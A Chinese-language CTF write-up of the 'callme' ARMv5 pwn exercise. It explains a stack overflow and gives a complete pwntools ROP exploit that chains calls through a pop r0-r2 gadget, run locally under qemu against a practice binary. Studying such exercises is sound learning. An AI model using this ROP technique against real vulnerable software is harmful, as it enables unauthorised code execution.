---
title: callme_armv5
date: 2023-03-23 19:40:15
categories: 
- pwn_wp
tags: 
- pwn
- arm
- ROP

---

arm pwn入门题，arm下的简单ROP。
<!-- more -->

查壳：同32位动态链接，只开了NX

```sh
[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/callme_armv5/callme_armv5'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
    RUNPATH:  b'.'
```

逆向：

也是``pwnme`中有栈溢出，但`UsefulFunction`和`UsefulGadgets`有些意义不明。

`pwnme`中提示我去看介绍，看了之后才明白

>You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag. 

我需要通过ROp走完`callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) -> callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d) -> callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)`才能`cat flag`。

`r0、r1、r2`分别控制第一、二、三个参数，还有这里要用elf.plt获取callme_xxx的地址，直接获取`BL callme_xxx`的不能正常跳到`callme_two`。

exp:

```sh
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='callme_armv5'
elf=ELF('./'+filename)
#libc=ELF('')
# p=process('./'+filename)
p=process(["qemu-arm","-L","/usr/arm-linux-gnueabi/", "./"+filename])
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    

callme_one=0x00010864
callme_two=0x00010854
callme_three=0x00010844

pop_r0_r1_r2_lr_pc=0x00010870

r()
payload=b'a'*0x24+p32(pop_r0_r1_r2_lr_pc)
payload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt['callme_one'])
payload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt['callme_two'])
payload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(elf.plt['callme_three'])*2
s(payload)

itr()
```

